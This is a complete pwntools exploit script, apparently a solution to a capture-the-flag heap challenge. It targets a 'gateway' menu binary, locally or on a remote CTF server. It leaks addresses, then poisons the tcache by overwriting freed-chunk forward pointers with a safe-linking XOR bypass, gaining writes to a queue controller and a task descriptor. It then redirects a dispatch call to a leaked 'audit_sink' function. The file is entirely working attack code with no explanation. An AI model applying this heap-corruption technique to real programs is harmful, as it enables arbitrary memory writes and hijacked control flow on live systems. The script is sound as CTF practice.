from pwn import *
context.binary = ELF("./bin", checksec=False)
context.log_level = "debug" 

def start():
    if args.REMOTE:
        io = remote("nc1.ctfplus.cn", 17941)
    else:
        io = process([b"./ld-linux-x86-64.so.2", b"--library-path", b".", b"./bin"])
    io.recvuntil(b"gateway> ")
    return io


def get_hex_after(out, marker):
    for line in out.splitlines():
        if marker in line:
            return int(line.split(marker, 1)[1].split()[0], 16)
    raise ValueError(f"missing marker: {marker!r}")


def cmd(io, n):
    io.sendline(str(n).encode())


def bootstrap(io):
    cmd(io, 3)
    io.recvuntil(b"gateway> ")


def inspect(io):
    cmd(io, 4)
    out = io.recvuntil(b"gateway> ", drop=True)
    queue_ctrl = get_hex_after(out, b"queue_ctrl=")
    task0 = get_hex_after(out, b"[task:0] desc=")
    return queue_ctrl, task0


def telemetry(io):
    cmd(io, 10)
    out = io.recvuntil(b"gateway> ", drop=True)
    return get_hex_after(out, b"diag.audit_sink=")


def alloc(io, slot, size, name):
    cmd(io, 5)
    io.sendlineafter(b"session.slot(0-15)> ", str(slot).encode())
    io.sendlineafter(b"session.tensor_bytes> ", str(size).encode())
    io.sendlineafter(b"session.alias> ", name)
    out = io.recvuntil(b"gateway> ", drop=True)
    return get_hex_after(out, b"handle=")


def free_session(io, slot):
    cmd(io, 6)
    io.sendlineafter(b"session.slot> ", str(slot).encode())
    io.recvuntil(b"gateway> ")


def patch_fd(io, slot, value):
    cmd(io, 7)
    io.sendlineafter(b"diag.session.slot> ", str(slot).encode())
    io.sendlineafter(b"diag.qword_index> ", b"0")
    io.sendlineafter(b"diag.qword_value(u64)> ", str(value).encode())
    io.recvuntil(b"gateway> ")


def worker(io, a, b, c, d, e, f, memo=b"x"):
    cmd(io, 8)
    io.sendlineafter(b"worker.cpu_quota> ", str(a).encode())
    io.sendlineafter(b"worker.mem_quota> ", str(b).encode())
    io.sendlineafter(b"worker.io_weight> ", str(c).encode())
    io.sendlineafter(b"worker.latency_slo> ", str(d).encode())
    io.sendlineafter(b"worker.replicas> ", str(e).encode())
    io.sendlineafter(b"worker.region_code> ", str(f).encode())
    io.sendlineafter(b"worker.memo> ", memo)
    io.recvuntil(b"gateway> ")


def dispatch(io, idx):
    cmd(io, 9)
    io.sendlineafter(b"queue.task_id> ", str(idx).encode())
    return io.recvuntil(b"gateway> ", drop=True)


def poison(io, target, s0, s1, s2, tag):
    alloc(io, s0, 0x10, tag + b"0")
    h1 = alloc(io, s1, 0x10, tag + b"1")
    free_session(io, s0)
    free_session(io, s1)
    patch_fd(io, s1, target ^ (h1 >> 12))
    alloc(io, s2, 0x10, tag + b"2")


def exploit(io):
    bootstrap(io)
    queue_ctrl, task0 = inspect(io)
    audit_sink = telemetry(io)

    log.info("queue_ctrl = %#x", queue_ctrl)
    log.info("task0_desc = %#x", task0)
    log.info("audit_sink = %#x", audit_sink)

    poison(io, queue_ctrl, 0, 1, 2, b"Q")
    worker(io, 0, 0, 0, 0, 0, 0, b"policy")

    poison(io, task0, 3, 4, 5, b"T")
    worker(
        io,
        0x1111111111111111,
        0x100,
        0x3333333333333333,
        audit_sink,
        task0,
        0x6666666666666666,
        b"owned",
    )

    out = dispatch(io, 0)
    print(out.decode(errors="ignore"))


if __name__ == "__main__":
    io = start()
    exploit(io)
